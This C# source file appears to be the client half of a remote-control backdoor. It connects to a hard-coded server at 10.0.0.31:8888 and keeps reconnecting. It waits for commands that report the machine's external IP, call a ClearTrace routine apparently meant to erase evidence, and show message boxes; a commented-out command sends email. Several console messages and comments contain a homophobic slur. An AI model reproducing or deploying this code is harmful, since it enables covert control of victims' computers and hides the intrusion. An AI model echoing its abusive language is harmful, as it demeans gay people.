using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Net.NetworkInformation;
using System.Text.RegularExpressions;
namespace ConsoleApplication1
{
    public class ClientThread
    {
        public bool IsConnected()
        {

            IPGlobalProperties ipProperties = IPGlobalProperties.GetIPGlobalProperties();
            TcpConnectionInformation[] tcpConnections = ipProperties.GetActiveTcpConnections().Where(x => x.LocalEndPoint.Equals(client.Client.LocalEndPoint) && x.RemoteEndPoint.Equals(client.Client.RemoteEndPoint)).ToArray();

            if (tcpConnections != null && tcpConnections.Length > 0)
            {
                TcpState stateOfConnection = tcpConnections.First().State;
                if (stateOfConnection == TcpState.Established)
                {
                    // Connection is OK
                    return true;
                }
                else
                {
                    // No active tcp Connection to hostName:port
                    return false;
                }

            }
            else
            {
                return false;
            }
        }
        public async Task connect(string ip, int port,TcpClient client)
        {
            try
            {
                //client.Close();

                await client.ConnectAsync(ip, port);
                Console.WriteLine("Oi oi, we connected faggot");
            }
            catch
            {

            }
           
            
        }
        public static string ip = "10.0.0.31";
        public static int port = 8888;
        public TcpClient client=new TcpClient();
        public ClientThread()
        {
            
            Task.Run(async () =>
            {

                //Console.WriteLine("Connecting...");
                await connect(ip, port,client);
               // Console.WriteLine("Connected faggot");
                while (true)
                {
                    try
                    {
                        if (!IsConnected())
                        {
                            //Console.WriteLine("Disconnected!");
                            //client.Close();
                            client = new TcpClient();
                            
                            await connect(ip, port, client);
                            //await client.ConnectAsync(ip, port);
                            //Console.WriteLine("Connected!");
                        }
                        else
                        {
                            NetworkStream stream = client.GetStream();

                            byte[] data = new Byte[100];
                            if (stream.DataAvailable)
                            {
                                await stream.ReadAsync(data, 0, 100);
                                var str = System.Text.Encoding.Default.GetString(data);
                                console(str);
                                byteConsole(data);
                            }
                            stream.Flush();
                            Thread.Sleep(2);

                        }
                    }
                    catch(SocketException e)
                    {

                        //client = new TcpClient();
                        //connect(ip, port, client);
                    }
                    catch (NullReferenceException r)
                    {

                        //Console.WriteLine(r);
                        //client = new TcpClient();
                        //connect(ip, port, client);
                    }
                }
            });
            
        }
        public void byteConsole(byte[] data)
        {
            switch(data[0]){
                case 0:
                    WriteData(new byte[]{0});
                    break;
                case 255:
                    switch (data[1])
                    {
                        case 0:
                             string externalIP1 = "error";
                        try
                        {

                            externalIP1 = (new WebClient()).DownloadString("http://checkip.dyndns.org/");
                            externalIP1 = (new Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"))
                                .Matches(externalIP1)[0].ToString();

                        }
                        catch { }
                        WriteData(new byte[]{255,0}.Concat(Encoding.ASCII.GetBytes(externalIP1)).ToArray());
                            break;
                        case 1:
                            Program.ClearTrace();
                            break;
                    }
                    break;
                case 1:
                    List<byte> dat = data.ToList<byte>();
                    dat.RemoveAt(0);
                    byte[] dat1 = dat.ToArray();
                    string str = System.Text.Encoding.Default.GetString(dat1);
                    Console.WriteLine(str);
                    break;
                
                default:
                    break;
            }

        }
        public void console(string str)
        {
            string[] command = str.Split(" ".ToCharArray());

            switch (command[0]) { 
                case "CLEARTRACE":
                    Program.ClearTrace();
                    break;
                //case "PING":
                  //  WriteData(Encoding.ASCII.GetBytes("PONG"));
                  //  break;
                case "SHOWMESSAGEBOX":
                    command[0] = "";
                    MessageBox.Show(String.Join(" ",command));
                    break;
                default:


                    //else if (command[0].Contains("EMAIL"))
                    //{
                    //    Program.SendEmail();
                    //    WriteData(Encoding.ASCII.GetBytes("Email Sent Faggot!"));
                    //}
                   // Console.WriteLine(str);
                  break;
            }
        }
        public void WriteData(byte[] data)
        {
            NetworkStream stream = client.GetStream();
            stream.Write(data, 0, data.Length);
        }
    }
}
